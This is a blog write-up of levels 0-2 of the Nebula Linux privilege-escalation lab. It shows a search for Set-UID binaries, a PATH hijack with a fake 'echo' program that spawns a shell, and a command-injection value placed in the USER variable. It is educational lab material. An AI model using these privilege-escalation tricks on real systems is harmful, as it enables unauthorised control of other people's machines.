---
title: "Writeup: Nebula (level 0 - level 2)"
date: 2020-12-16T14:42:58+08:00
draft: false
---

Nebula is a virtual machine that covers a variety of challenges about Linux privilege escalation, scripting language issues, and file system race conditions. It is available at [Exploit Exercises](https://exploit-exercises.lains.space/). 

<br>

## Level 0

Here is the description about Level 0. 

```
About
This level requires you to find a Set User ID program that will run as the “flag00”
account. You could also find this by carefully looking in top level directories in 
/ for suspicious looking directories.

Alternatively, look at the find man page.

To access this level, log in as level00 with the password of level00.
```

According to the hint, we need to find a program which can run as the "flag00". Basically, "find" is used to search for files in a directory hierarchy. Unix systems also provide the flag `-perm` to find the file based on its permission. 

First, login in as level00 and check the identifier information. 

![](https://github.com/chuang76/image/blob/master/00-1.PNG?raw=true)

As we mentioned above, we can search our target with find command. The slash (/) symbol means the root directory. To avoid the verbose error message, let's redirect stderr to a file called err (or you can redirect unwanted output to /dev/null). 

```
$ find / -type f -perm /u+s 2>err | grep "flag00"
```

Two files match the conditions. 

![](https://github.com/chuang76/image/blob/master/00-2.PNG?raw=true)

As you can see, the owner and the group of /bin/.../flag00 and /rofs/bin/.../flag00 is flag00 and level00, respectively. The vulnerability is that the permission of files was set to `rwsr-xr--`, that is, they are Set-UID programs. Since we logged in as level00, when we run the programs, we can get the privilege as the owner flag00. 

Here is the flag. 

![](https://github.com/chuang76/image/blob/master/00-3.PNG?raw=true)

<br>

## Level 1

The description of Level 1 is provided as follows. 

```
There is a vulnerability in the below program that allows arbitrary programs 
to be executed, can you find it?

To do this level, log in as the level01 account with the password level01. 
Files for this level can be found in /home/flag01.
```

The source code is also available. 

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
    gid_t gid;
    uid_t uid;
    gid = getegid();
    uid = geteuid();

    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);

    system("/usr/bin/env echo and now what?");
}
```

Let's run the program. The parameter "/usr/bin/env" is used to set the PATH. PATH is an environment variable in Unix-based systems, it tells the shell which directories to search for executable files. Then, the program displays the text "and now what". 

However, there is a vulnerability: flag01 is a Set-UID program while it contains a system() function. So it provides the attackers to execute an arbitrary shell command. 

![](https://github.com/chuang76/image/blob/master/01-1.PNG?raw=true)

Our goal is to execute system("/bin/bash"), but how can we modify the parameters of system function? Here is a solution: we can modify "echo" as an executable to execute the /bin/bash command. In other words, we deceive the program to make it run echo as an executable, instead of its original functionality (i.e., display the text). 

Here is our exploit program in the /home/level01 directory, compile it and name the executable as echo. 

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char** argv)
{
    gid_t gid = getegid();
    uid_t uid = geteuid();

    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);

    system("/bin/bash");
}
```

Next, let's set the PATH variable. Actually, PATH is a list of directories that are walked through in the order. The colon (:) symbol is a separator. Hence, our prepared directory (i.e., the directory that contains executable echo) should be added before the original PATH variable ($PATH). So it should be 

```
$ export PATH=/home/level01:$PATH 
```

rather than

```
$ export PATH=$PATH:/home/level01
```

Run flag01 again, and get the flag. 

![](https://github.com/chuang76/image/blob/master/01-3.PNG?raw=true)

<br>

## Level 2

The description of Level 2 is provided as follows. 

```
There is a vulnerability in the below program that allows arbitrary programs 
to be executed, can you find it?

To do this level, log in as the level02 account with the password level02. 
Files for this level can be found in /home/flag02.
```

The source code is available. 

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
    char *buffer;

    gid_t gid;
    uid_t uid;

    gid = getegid();
    uid = geteuid();

    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);

    buffer = NULL;

    asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
    printf("about to call system(\"%s\")\n", buffer);

    system(buffer);
}
```

The function getenv() is used to get environment variables. The function asprintf() is used to print to allocated string. It is identical to printf(), except that after executing asprintf(), the first parameter will point to a certain string. In our case, buffer is going to point to the string "/bin/echo %s is cool", and will be treated as the parameter of system() function. 

Again, our goal is to perform system("/bin/bash"). The program contains a vulnerability: it provides the user to feed an arbitrary string to the program. As a result, we can make "/bin/bash" as the value of the key USER. 

Wait, something smells fishy. The string "/bin/echo /bin/bash is cool" can not make system function run properly. Since we aren't able to control the characters "/bin/echo is cool", we can craft the string to run multiple commands. For example, 

```
"/bin/echo && /bin/bash && /bin/echo is cool"
           ^^^^^^^^^^^^^^^^^^^^^^^^^           the value of the key "USER"
```

Here is the flag. 

![](https://github.com/chuang76/image/blob/master/02-1.PNG?raw=true)

<br>

## Brief Summary 

The vulnerabilities of Set-UID programs:

1. user inputs
2. environment variables
3. system inputs controlled by users.

